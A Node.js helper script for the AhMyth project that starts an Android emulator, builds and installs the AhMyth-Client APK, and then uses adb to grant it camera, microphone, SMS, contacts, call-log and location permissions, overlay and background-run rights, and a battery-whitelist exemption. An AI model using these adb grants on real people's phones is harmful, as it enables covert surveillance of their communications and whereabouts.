#!/usr/bin/env node

/**
 * AhMyth Android Emulator Manager
 * Handles Android emulator operations for development and testing
 */

const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

class EmulatorManager {
    constructor() {
        this.isWindows = os.platform() === 'win32';
        this.adbPath = this.findADB();
        this.emulatorPath = this.findEmulator();
        this.packageName = 'ahmyth.mine.king.ahmyth';
        this.mainActivity = 'ahmyth.mine.king.ahmyth.MainActivity';
    }

    findADB() {
        try {
            // Try to find ADB in PATH
            execSync('adb version', { stdio: 'ignore' });
            return 'adb';
        } catch (e) {
            // Try common Android SDK locations
            const sdkPaths = [
                process.env.ANDROID_HOME,
                process.env.ANDROID_SDK_ROOT,
                path.join(os.homedir(), 'Android', 'Sdk'),
                path.join(os.homedir(), 'AppData', 'Local', 'Android', 'Sdk'),
                '/opt/android-sdk',
                '/usr/local/android-sdk',
                '/Library/Android/sdk'
            ].filter(Boolean);

            for (const sdkPath of sdkPaths) {
                const adbPath = path.join(sdkPath, 'platform-tools', this.isWindows ? 'adb.exe' : 'adb');
                if (fs.existsSync(adbPath)) {
                    return adbPath;
                }
            }
            throw new Error('ADB not found. Please install Android SDK or add ADB to PATH');
        }
    }

    findEmulator() {
        try {
            // Try to find emulator in PATH
            execSync('emulator -version', { stdio: 'ignore' });
            return 'emulator';
        } catch (e) {
            // Try common Android SDK locations
            const sdkPaths = [
                process.env.ANDROID_HOME,
                process.env.ANDROID_SDK_ROOT,
                path.join(os.homedir(), 'Android', 'Sdk'),
                path.join(os.homedir(), 'AppData', 'Local', 'Android', 'Sdk'),
                '/opt/android-sdk',
                '/usr/local/android-sdk',
                '/Library/Android/sdk'
            ].filter(Boolean);

            for (const sdkPath of sdkPaths) {
                const emulatorPath = path.join(sdkPath, 'emulator', this.isWindows ? 'emulator.exe' : 'emulator');
                if (fs.existsSync(emulatorPath)) {
                    return emulatorPath;
                }
            }
            throw new Error('Android emulator not found. Please install Android SDK');
        }
    }

    runCommand(command, options = {}) {
        console.log(`[EXEC] ${command}`);
        try {
            const result = execSync(command, {
                stdio: options.silent ? 'pipe' : 'inherit',
                encoding: 'utf8',
                ...options
            });
            return result;
        } catch (error) {
            if (!options.ignoreErrors) {
                console.error(`Command failed: ${command}`);
                console.error(error.message);
                process.exit(1);
            }
            return error.stdout || '';
        }
    }

    getConnectedDevices() {
        try {
            const output = this.runCommand(`${this.adbPath} devices`, { silent: true });
            const lines = output.trim().split('\n').slice(1); // Skip "List of devices attached"
            const devices = lines
                .map(line => line.trim().split('\t'))
                .filter(([id, status]) => id && status === 'device')
                .map(([id]) => id);

            return devices;
        } catch (e) {
            return [];
        }
    }

    waitForDevice(timeout = 30000) {
        console.log('Waiting for device to be ready...');
        const startTime = Date.now();

        while (Date.now() - startTime < timeout) {
            const devices = this.getConnectedDevices();
            if (devices.length > 0) {
                console.log(`Device ready: ${devices[0]}`);
                return devices[0];
            }
            // Wait 1 second before checking again
            this.runCommand('timeout 1', { ignoreErrors: true });
        }

        throw new Error('No device found within timeout period');
    }

    startEmulator(avd = null) {
        console.log('Starting Android emulator...');

        // If no AVD specified, try to find one
        if (!avd) {
            try {
                const avdList = this.runCommand(`${this.emulatorPath} -list-avds`, { silent: true });
                const avds = avdList.trim().split('\n').filter(line => line.trim());
                if (avds.length === 0) {
                    throw new Error('No AVDs found. Please create an Android Virtual Device first.');
                }
                avd = avds[0];
                console.log(`Using AVD: ${avd}`);
            } catch (e) {
                console.error('Error listing AVDs:', e.message);
                console.log('Please specify an AVD with --avd option');
                process.exit(1);
            }
        }

        // Start emulator in background
        const emulatorProcess = spawn(this.emulatorPath, ['-avd', avd, '-no-audio'], {
            detached: true,
            stdio: 'ignore'
        });

        emulatorProcess.unref();

        console.log(`Emulator starting with AVD: ${avd}`);
        console.log('This may take a few minutes...');

        // Wait for device to be ready
        this.waitForDevice();

        console.log('Emulator is ready!');
    }

    buildAPK() {
        console.log('Building APK...');
        const clientDir = path.join(__dirname, '..', 'AhMyth-Client');

        if (!fs.existsSync(clientDir)) {
            throw new Error('AhMyth-Client directory not found');
        }

        process.chdir(clientDir);

        // Clean and build
        if (this.isWindows) {
            this.runCommand('gradlew.bat clean assembleDebug');
        } else {
            this.runCommand('./gradlew clean assembleDebug');
        }

        const apkPath = path.join(clientDir, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
        if (!fs.existsSync(apkPath)) {
            throw new Error('APK build failed - file not found');
        }

        console.log(`APK built: ${apkPath}`);
        return apkPath;
    }

    installAPK(apkPath = null) {
        console.log('Installing APK...');

        if (!apkPath) {
            // Look for built APK
            apkPath = path.join(__dirname, '..', 'AhMyth-Client', 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
        }

        if (!fs.existsSync(apkPath)) {
            throw new Error(`APK not found: ${apkPath}`);
        }

        this.waitForDevice();

        // Uninstall first if exists
        console.log('Uninstalling existing app...');
        this.runCommand(`${this.adbPath} uninstall ${this.packageName}`, { ignoreErrors: true });

        // Install with grants
        this.runCommand(`${this.adbPath} install -r -g "${apkPath}"`);

        console.log('APK installed successfully');
    }

    launchApp() {
        console.log('Launching app...');
        this.waitForDevice();

        this.runCommand(`${this.adbPath} shell am start -n ${this.packageName}/${this.mainActivity}`);
        console.log('App launched');
    }

    grantPermissions() {
        console.log('Granting permissions...');
        this.waitForDevice();

        const permissions = [
            'android.permission.CAMERA',
            'android.permission.RECORD_AUDIO',
            'android.permission.READ_CONTACTS',
            'android.permission.WRITE_CONTACTS',
            'android.permission.READ_SMS',
            'android.permission.SEND_SMS',
            'android.permission.RECEIVE_SMS',
            'android.permission.READ_CALL_LOG',
            'android.permission.READ_PHONE_STATE',
            'android.permission.CALL_PHONE',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.ACCESS_COARSE_LOCATION',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WRITE_EXTERNAL_STORAGE',
            'android.permission.POST_NOTIFICATIONS'
        ];

        for (const perm of permissions) {
            try {
                this.runCommand(`${this.adbPath} shell pm grant ${this.packageName} ${perm}`, { ignoreErrors: true });
            } catch (e) {
                // Some permissions might not be grantable via ADB
            }
        }

        // Special permissions via appops
        const appops = [
            'SYSTEM_ALERT_WINDOW allow',
            'GET_USAGE_STATS allow',
            'WRITE_SETTINGS allow',
            'MANAGE_EXTERNAL_STORAGE allow',
            'RUN_IN_BACKGROUND allow',
            'RUN_ANY_IN_BACKGROUND allow'
        ];

        for (const op of appops) {
            try {
                this.runCommand(`${this.adbPath} shell appops set ${this.packageName} ${op}`, { ignoreErrors: true });
            } catch (e) {
                // Some appops might not be settable
            }
        }

        // Battery optimization exemption
        try {
            this.runCommand(`${this.adbPath} shell cmd deviceidle whitelist +${this.packageName}`, { ignoreErrors: true });
        } catch (e) {}

        console.log('Permissions granted');
    }

    showDevices() {
        console.log('Connected devices:');
        const devices = this.getConnectedDevices();
        if (devices.length === 0) {
            console.log('No devices connected');
        } else {
            devices.forEach(device => console.log(`  ${device}`));
        }
    }

    showLogcat() {
        console.log('Starting logcat... (Press Ctrl+C to stop)');
        this.waitForDevice();

        const logcat = spawn(this.adbPath, ['logcat', '-v', 'time'], {
            stdio: 'inherit'
        });

        logcat.on('close', () => {
            console.log('Logcat stopped');
        });
    }

    clean() {
        console.log('Cleaning build artifacts...');
        const clientDir = path.join(__dirname, '..', 'AhMyth-Client');

        if (fs.existsSync(clientDir)) {
            process.chdir(clientDir);
            if (this.isWindows) {
                this.runCommand('gradlew.bat clean', { ignoreErrors: true });
            } else {
                this.runCommand('./gradlew clean', { ignoreErrors: true });
            }
        }

        // Remove any APK files in root
        const rootDir = path.join(__dirname, '..');
        const files = fs.readdirSync(rootDir);
        files.forEach(file => {
            if (file.endsWith('.apk')) {
                const filePath = path.join(rootDir, file);
                try {
                    fs.unlinkSync(filePath);
                    console.log(`Removed: ${file}`);
                } catch (e) {}
            }
        });

        console.log('Clean completed');
    }

    main() {
        const args = process.argv.slice(2);
        const command = args[0];

        switch (command) {
            case '--avd':
                const avdName = args[1];
                this.startEmulator(avdName);
                break;

            case '--launch-app':
                this.launchApp();
                break;

            case '--devices':
                this.showDevices();
                break;

            case '--logcat':
                this.showLogcat();
                break;

            case '--clean':
                this.clean();
                break;

            case '--build':
                this.buildAPK();
                break;

            case '--install':
                const apkPath = args[1];
                this.installAPK(apkPath);
                break;

            case '--grant':
                this.grantPermissions();
                break;

            default:
                // Default: start emulator, build, install, grant permissions, launch
                console.log('AhMyth Android Emulator Manager');
                console.log('================================');
                console.log('');

                try {
                    this.startEmulator();
                    const apkPath = this.buildAPK();
                    this.installAPK(apkPath);
                    this.grantPermissions();
                    this.launchApp();

                    console.log('');
                    console.log('Setup complete! The app should now be running on the emulator.');
                    console.log('Use "bun run logcat" to view device logs');
                } catch (error) {
                    console.error('Setup failed:', error.message);
                    process.exit(1);
                }
                break;
        }
    }
}

// Run the manager
const manager = new EmulatorManager();
manager.main();













